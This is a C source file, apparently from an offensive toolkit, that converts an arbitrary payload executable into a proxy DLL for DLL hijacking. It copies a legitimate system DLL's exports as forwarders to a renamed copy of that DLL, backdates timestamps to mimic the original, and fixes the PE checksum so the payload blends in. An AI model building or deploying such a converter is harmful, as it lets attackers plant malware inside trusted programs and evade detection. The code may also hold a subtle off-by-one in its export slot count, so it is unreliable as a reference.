#include "pe_patcher.h"
#include <Shlwapi.h>
#include <strsafe.h>

static BOOL ReadFileFromDiskW(LPCWSTR szFileName, PBYTE* ppFileBuffer, PDWORD pdwFileSize);

static DWORD RvaToFileOffset(PIMAGE_NT_HEADERS pNtHdrs, DWORD dwRva)
{
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);
    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++, pSection++)
    {
        if (dwRva >= pSection->VirtualAddress && dwRva < pSection->VirtualAddress + pSection->Misc.VirtualSize)
            return (dwRva - pSection->VirtualAddress) + pSection->PointerToRawData;
    }
    return 0x00;
}

static DWORD ComputePECheckSum(PVOID pFileBuffer, DWORD dwFileSize)
{
    if (!pFileBuffer || !dwFileSize)
        return 0x00;

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)pFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return 0x00;

    PWORD pwWordView = (PWORD)pFileBuffer;
    DWORD dwWordCount = (dwFileSize + 1) / sizeof(WORD);
    DWORD dwChkSumIdx = (DWORD)((PBYTE)&pNtHdrs->OptionalHeader.CheckSum - (PBYTE)pFileBuffer) / sizeof(WORD);
    ULONGLONG ullAccumulator = 0x00;

    for (DWORD i = 0; i < dwWordCount; i++)
    {
        if (i == dwChkSumIdx || i == dwChkSumIdx + 1)
            continue;
        ullAccumulator = (ullAccumulator & 0xFFFF) + (ullAccumulator >> 16) + pwWordView[i];
    }

    ullAccumulator = (ullAccumulator & 0xFFFF) + (ullAccumulator >> 16);
    return (DWORD)((WORD)ullAccumulator + dwFileSize);
}

static DWORD GetDllTimestamp(PVOID pFileBuffer, DWORD dwFileSize)
{
    if (!pFileBuffer || !dwFileSize)
        return 0x00;

    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    uli.QuadPart -= 116444736000000000ULL;
    uli.QuadPart /= 10000000ULL;

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)pFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return 0x00;

#define SECONDS_PER_DAY (60 * 60 * 24)
#define DAYS_TO_SECONDS(x) ((x) * SECONDS_PER_DAY)

    DWORD dwTimeStamp = pNtHdrs->FileHeader.TimeDateStamp;

    if (dwTimeStamp > (DWORD)uli.QuadPart || dwTimeStamp < DAYS_TO_SECONDS(30))
        dwTimeStamp = (DWORD)uli.QuadPart - DAYS_TO_SECONDS(60);
    else
        dwTimeStamp = dwTimeStamp - DAYS_TO_SECONDS(30);

#undef SECONDS_PER_DAY
#undef DAYS_TO_SECONDS

    return dwTimeStamp;
}

static BOOL BuildExportTableFromDll(ULONG_PTR uDllFileBuffer, DWORD dwDllFileSize, LPCSTR pszCopiedDllName, PEXPORT_ENTRY* ppExportTable, PDWORD pdwExportCount)
{
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(uDllFileBuffer + ((PIMAGE_DOS_HEADER)uDllFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)uDllFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    if (!pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
    PDWORD pdwFuncRVAs = (PDWORD)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pExportDir->AddressOfFunctions));
    PDWORD pdwNameRVAs = (PDWORD)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pExportDir->AddressOfNames));
    PWORD pwNameOrdinals = (PWORD)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pExportDir->AddressOfNameOrdinals));

    CHAR szModulePrefix[MAX_PATH] = { 0 };
    StringCchCopyA(szModulePrefix, ARRAYSIZE(szModulePrefix), pszCopiedDllName);
    PathRemoveExtensionA(szModulePrefix);
    CharUpperA(szModulePrefix);

    DWORD dwActualCount = 0, dwTotalStringSize = 0;
    CHAR szForwardBuf[MAX_PATH] = { 0 };

    for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
    {
        if (!pdwFuncRVAs[i])
            continue;

        WORD wOrdinal = (WORD)(pExportDir->Base + i);
        LPCSTR pszName = NULL;
        for (DWORD j = 0; j < pExportDir->NumberOfNames; j++)
        {
            if (pwNameOrdinals[j] == i)
            {
                pszName = (LPCSTR)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pdwNameRVAs[j]));
                break;
            }
        }

        if (pszName)
        {
            dwTotalStringSize += (DWORD)lstrlenA(pszName) + 1;
            dwTotalStringSize += (DWORD)lstrlenA(szModulePrefix) + 1 + (DWORD)lstrlenA(pszName) + 1;
        }
        else
        {
            wsprintfA(szForwardBuf, "%s.#%u", szModulePrefix, wOrdinal);
            dwTotalStringSize += (DWORD)lstrlenA(szForwardBuf) + 1;
        }
        dwActualCount++;
    }

    if (!dwActualCount)
        return FALSE;

    ULONG_PTR uBlobBuffer = (ULONG_PTR)HeapAlloc(GetProcessHeap(), 0, ((dwActualCount + 1) * sizeof(EXPORT_ENTRY) + dwTotalStringSize));
    if (!uBlobBuffer)
        return FALSE;

    PEXPORT_ENTRY pEntries = (PEXPORT_ENTRY)uBlobBuffer;
    PBYTE pStrings = (PBYTE)(uBlobBuffer + (dwActualCount + 1) * sizeof(EXPORT_ENTRY));
    DWORD dwStringOffset = 0;

    for (DWORD i = 0, dwEntryIdx = 0; i < pExportDir->NumberOfFunctions; i++)
    {
        if (!pdwFuncRVAs[i])
            continue;

        WORD wOrdinal = (WORD)(pExportDir->Base + i);
        LPCSTR pszName = NULL;
        for (DWORD j = 0; j < pExportDir->NumberOfNames; j++)
        {
            if (pwNameOrdinals[j] == i)
            {
                pszName = (LPCSTR)(uDllFileBuffer + RvaToFileOffset(pNtHdrs, pdwNameRVAs[j]));
                break;
            }
        }

        pEntries[dwEntryIdx].uFuncAddress = 0x00;
        pEntries[dwEntryIdx].wOrdinal = wOrdinal;

        if (pszName)
        {
            DWORD dwLen = (DWORD)lstrlenA(pszName) + 1;
            RtlCopyMemory(pStrings + dwStringOffset, pszName, dwLen);
            pEntries[dwEntryIdx].pszName = (LPCSTR)(pStrings + dwStringOffset);
            dwStringOffset += dwLen;

            wsprintfA(szForwardBuf, "%s.%s", szModulePrefix, pszName);
            dwLen = (DWORD)lstrlenA(szForwardBuf) + 1;
            RtlCopyMemory(pStrings + dwStringOffset, szForwardBuf, dwLen);
            pEntries[dwEntryIdx].pszForward = (LPCSTR)(pStrings + dwStringOffset);
            dwStringOffset += dwLen;
        }
        else
        {
            pEntries[dwEntryIdx].pszName = NULL;
            wsprintfA(szForwardBuf, "%s.#%u", szModulePrefix, wOrdinal);
            DWORD dwLen = (DWORD)lstrlenA(szForwardBuf) + 1;
            RtlCopyMemory(pStrings + dwStringOffset, szForwardBuf, dwLen);
            pEntries[dwEntryIdx].pszForward = (LPCSTR)(pStrings + dwStringOffset);
            dwStringOffset += dwLen;
        }
        dwEntryIdx++;
    }

    pEntries[dwActualCount].pszName = NULL;
    pEntries[dwActualCount].uFuncAddress = 0x00;
    pEntries[dwActualCount].wOrdinal = INVALID_ORDINAL;
    pEntries[dwActualCount].pszForward = NULL;

    *ppExportTable = pEntries;
    *pdwExportCount = dwActualCount;
    return TRUE;
}

static BOOL PatchExportAddressTable(PULONG_PTR puFileBuffer, PDWORD pdwFileSize, LPCSTR pszDllName, PEXPORT_ENTRY pExportTable, DWORD dwExportCount, DWORD dwTimeDateStamp)
{
    DWORD dwNumExports = 0, dwNumNames = 0, dwNumFuncSlots = 0;
    while (dwNumExports < dwExportCount && pExportTable[dwNumExports].wOrdinal != INVALID_ORDINAL)
    {
        if (pExportTable[dwNumExports].pszName != NULL)
            dwNumNames++;

        if ((DWORD)pExportTable[dwNumExports].wOrdinal + 1 > dwNumFuncSlots)
            dwNumFuncSlots = (DWORD)pExportTable[dwNumExports].wOrdinal;

        dwNumExports++;
    }

    if (dwNumExports == 0)
        return FALSE;

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(*puFileBuffer + ((PIMAGE_DOS_HEADER)*puFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)*puFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    DWORD dwSectionAlign = pNtHdrs->OptionalHeader.SectionAlignment;
    DWORD dwFileAlign = pNtHdrs->OptionalHeader.FileAlignment;
    PIMAGE_SECTION_HEADER pLastSection = IMAGE_FIRST_SECTION(pNtHdrs) + (pNtHdrs->FileHeader.NumberOfSections - 1);
    DWORD dwSectionVA = ALIGN_UP(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlign);
    DWORD dwSectionRaw = ALIGN_UP(*pdwFileSize, dwFileAlign);

    DWORD dwOffExpDir = 0x00;
    DWORD dwOffFuncRVAs = dwOffExpDir + sizeof(IMAGE_EXPORT_DIRECTORY);
    DWORD dwOffNameRVAs = dwOffFuncRVAs + dwNumFuncSlots * sizeof(DWORD);
    DWORD dwOffOrdinals = dwOffNameRVAs + dwNumNames * sizeof(DWORD);
    DWORD dwOffDllName = ALIGN_UP(dwOffOrdinals + dwNumNames * sizeof(WORD), sizeof(DWORD));
    DWORD dwOffNames = dwOffDllName + (DWORD)lstrlenA(pszDllName) + 1;

    DWORD dwBlobSize = dwOffNames;
    for (DWORD i = 0; i < dwNumExports; i++)
    {
        if (pExportTable[i].pszName != NULL) dwBlobSize += (DWORD)lstrlenA(pExportTable[i].pszName) + 1;
        if (pExportTable[i].pszForward != NULL) dwBlobSize += (DWORD)lstrlenA(pExportTable[i].pszForward) + 1;
    }

    DWORD dwNewFileSize = dwSectionRaw + ALIGN_UP(dwBlobSize, dwFileAlign);
    ULONG_PTR uNewBuffer = (ULONG_PTR)HeapAlloc(GetProcessHeap(), 0, dwNewFileSize);
    if (!uNewBuffer) return FALSE;

    RtlCopyMemory((PVOID)uNewBuffer, (PVOID)*puFileBuffer, *pdwFileSize);
    HeapFree(GetProcessHeap(), 0, (PVOID)*puFileBuffer);

    pNtHdrs = (PIMAGE_NT_HEADERS)(uNewBuffer + ((PIMAGE_DOS_HEADER)uNewBuffer)->e_lfanew);
    PIMAGE_SECTION_HEADER pNewSectionCheck = IMAGE_FIRST_SECTION(pNtHdrs) + pNtHdrs->FileHeader.NumberOfSections;
    if ((DWORD)((PBYTE)(pNewSectionCheck + 1) - (PBYTE)uNewBuffer) > pNtHdrs->OptionalHeader.SizeOfHeaders)
    {
        HeapFree(GetProcessHeap(), 0, (PVOID)uNewBuffer);
        return FALSE;
    }

    PBYTE pBlob = (PBYTE)(uNewBuffer + dwSectionRaw);

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBlob + dwOffExpDir);
    pExportDir->Name = dwSectionVA + dwOffDllName;
    pExportDir->Base = 0x01;
    pExportDir->TimeDateStamp = dwTimeDateStamp;
    pExportDir->NumberOfFunctions = dwNumFuncSlots;
    pExportDir->NumberOfNames = dwNumNames;
    pExportDir->AddressOfFunctions = dwSectionVA + dwOffFuncRVAs;
    pExportDir->AddressOfNames = dwSectionVA + dwOffNameRVAs;
    pExportDir->AddressOfNameOrdinals = dwSectionVA + dwOffOrdinals;

    PDWORD pdwFuncRVAs = (PDWORD)(pBlob + dwOffFuncRVAs);
    PDWORD pdwNameRVAs = (PDWORD)(pBlob + dwOffNameRVAs);
    PWORD pwOrdinals = (PWORD)(pBlob + dwOffOrdinals);

    RtlCopyMemory(pBlob + dwOffDllName, pszDllName, lstrlenA(pszDllName) + 1);

    DWORD dwOffForwards = dwOffNames;
    for (DWORD i = 0; i < dwNumExports; i++)
    {
        if (pExportTable[i].pszName != NULL) dwOffForwards += (DWORD)lstrlenA(pExportTable[i].pszName) + 1;
    }

    DWORD dwNameIdx = 0;
    for (DWORD i = 0; i < dwNumExports; i++)
    {
        PEXPORT_ENTRY pEntry = &pExportTable[i];
        if (pEntry->pszForward != NULL)
        {
            pdwFuncRVAs[pEntry->wOrdinal - pExportDir->Base] = dwSectionVA + dwOffForwards;
            DWORD dwStrSize = (DWORD)lstrlenA(pEntry->pszForward) + 1;
            RtlCopyMemory(pBlob + dwOffForwards, pEntry->pszForward, dwStrSize);
            dwOffForwards += dwStrSize;
        }

        if (pEntry->pszName != NULL)
        {
            pdwNameRVAs[dwNameIdx] = dwSectionVA + dwOffNames;
            pwOrdinals[dwNameIdx] = (WORD)(pEntry->wOrdinal - pExportDir->Base);
            dwNameIdx++;

            DWORD dwStrSize = (DWORD)lstrlenA(pEntry->pszName) + 1;
            RtlCopyMemory(pBlob + dwOffNames, pEntry->pszName, dwStrSize);
            dwOffNames += dwStrSize;
        }
    }

    if (dwNumNames > 1)
    {
        for (DWORD i = 0; i < dwNumNames - 1; i++)
        {
            for (DWORD j = i + 1; j < dwNumNames; j++)
            {
                LPCSTR pszA = (LPCSTR)(uNewBuffer + dwSectionRaw + (pdwNameRVAs[i] - dwSectionVA));
                LPCSTR pszB = (LPCSTR)(uNewBuffer + dwSectionRaw + (pdwNameRVAs[j] - dwSectionVA));
                if (lstrcmpA(pszA, pszB) > 0)
                {
                    DWORD dwTmp = pdwNameRVAs[i]; pdwNameRVAs[i] = pdwNameRVAs[j]; pdwNameRVAs[j] = dwTmp;
                    WORD wTmp = pwOrdinals[i]; pwOrdinals[i] = pwOrdinals[j]; pwOrdinals[j] = wTmp;
                }
            }
        }
    }

    PIMAGE_SECTION_HEADER pNewSection = IMAGE_FIRST_SECTION(pNtHdrs) + pNtHdrs->FileHeader.NumberOfSections;
    RtlSecureZeroMemory(pNewSection, sizeof(IMAGE_SECTION_HEADER));
    RtlCopyMemory(pNewSection->Name, EDATA_SECTION_NAME, sizeof(EDATA_SECTION_NAME) - 1);
    pNewSection->Misc.VirtualSize = dwBlobSize;
    pNewSection->VirtualAddress = dwSectionVA;
    pNewSection->SizeOfRawData = ALIGN_UP(dwBlobSize, dwFileAlign);
    pNewSection->PointerToRawData = dwSectionRaw;
    pNewSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;

    pNtHdrs->FileHeader.NumberOfSections++;
    pNtHdrs->FileHeader.TimeDateStamp = dwTimeDateStamp;
    pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress = dwSectionVA;
    pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size = dwBlobSize;
    pNtHdrs->OptionalHeader.SizeOfImage = dwSectionVA + ALIGN_UP(dwBlobSize, dwSectionAlign);
    pNtHdrs->OptionalHeader.CheckSum = ComputePECheckSum((PVOID)uNewBuffer, dwNewFileSize);

    *puFileBuffer = uNewBuffer;
    *pdwFileSize = dwNewFileSize;
    return TRUE;
}

BOOL ConvertPayloadToProxy(LPCWSTR pwszPayloadPath, LPCWSTR pwszSystemDllPath, LPCWSTR pwszForwardDllName, PBYTE* ppDllBuffer, PDWORD pdwDllFileSize)
{
    PBYTE pPayloadBuffer = NULL;
    DWORD dwPayloadSize = 0;
    PBYTE pOriginalDllBuffer = NULL;
    DWORD dwOriginalDllSize = 0;
    PEXPORT_ENTRY pExportTable = NULL;
    DWORD dwExportCount = 0;
    ULONG_PTR uFileBuffer = 0;
    DWORD dwFileSize = 0;
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;

    if (!ppDllBuffer || !pdwDllFileSize || !pwszPayloadPath || !pwszSystemDllPath || !pwszForwardDllName)
        return FALSE;

    *ppDllBuffer = NULL;
    *pdwDllFileSize = 0;

    PBYTE pTempPayloadBuffer = NULL;
    DWORD dwTempPayloadSize = 0;
    if (!ReadFileFromDiskW(pwszPayloadPath, &pTempPayloadBuffer, &dwTempPayloadSize))
        return FALSE;
    pPayloadBuffer = pTempPayloadBuffer;
    dwPayloadSize = dwTempPayloadSize;

    uFileBuffer = (ULONG_PTR)pPayloadBuffer;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uFileBuffer + ((PIMAGE_DOS_HEADER)uFileBuffer)->e_lfanew);
    if (((PIMAGE_DOS_HEADER)uFileBuffer)->e_magic != IMAGE_DOS_SIGNATURE || pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    {
        HeapFree(GetProcessHeap(), 0, (PVOID)uFileBuffer);
        return FALSE;
    }

    pImgNtHdrs->FileHeader.Characteristics |= IMAGE_FILE_DLL;
    pImgNtHdrs->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

    if (!ReadFileFromDiskW(pwszSystemDllPath, &pOriginalDllBuffer, &dwOriginalDllSize))
    {
        HeapFree(GetProcessHeap(), 0, (PVOID)uFileBuffer);
        return FALSE;
    }

    DWORD dwOriginalDllTimeStamp = GetDllTimestamp(pOriginalDllBuffer, dwOriginalDllSize);

    char szForwardDllNameA[MAX_PATH] = { 0 };
    WideCharToMultiByte(CP_ACP, 0, pwszForwardDllName, -1, szForwardDllNameA, MAX_PATH, NULL, NULL);

    if (!BuildExportTableFromDll((ULONG_PTR)pOriginalDllBuffer, dwOriginalDllSize, szForwardDllNameA, &pExportTable, &dwExportCount))
    {
        HeapFree(GetProcessHeap(), 0, pOriginalDllBuffer);
        HeapFree(GetProcessHeap(), 0, (PVOID)uFileBuffer);
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pOriginalDllBuffer);

    DWORD dwDbgDirRva = pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
    if (dwDbgDirRva)
    {
        PIMAGE_DEBUG_DIRECTORY pDebugDir = (PIMAGE_DEBUG_DIRECTORY)(uFileBuffer + RvaToFileOffset(pImgNtHdrs, dwDbgDirRva));
        DWORD dwDbgCount = pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size / sizeof(IMAGE_DEBUG_DIRECTORY);
        for (DWORD i = 0; i < dwDbgCount; i++)
            pDebugDir[i].TimeDateStamp = dwOriginalDllTimeStamp;
    }

    char szSystemDllNameA[MAX_PATH] = { 0 };
    WideCharToMultiByte(CP_ACP, 0, PathFindFileNameW(pwszSystemDllPath), -1, szSystemDllNameA, MAX_PATH, NULL, NULL);

    if (!PatchExportAddressTable(&uFileBuffer, &dwPayloadSize, szSystemDllNameA, pExportTable, dwExportCount, dwOriginalDllTimeStamp))
    {
        HeapFree(GetProcessHeap(), 0, pExportTable);
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pExportTable);

    *ppDllBuffer = (PBYTE)uFileBuffer;
    *pdwDllFileSize = dwPayloadSize;
    return TRUE;
}

static BOOL ReadFileFromDiskW(LPCWSTR szFileName, PBYTE* ppFileBuffer, PDWORD pdwFileSize)
{
    HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        CloseHandle(hFile);
        return FALSE;
    }

    PBYTE pFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwFileSize);
    if (!pFileBuffer)
    {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, pFileBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        HeapFree(GetProcessHeap(), 0, pFileBuffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    *ppFileBuffer = pFileBuffer;
    *pdwFileSize = dwFileSize;
    return TRUE;
}
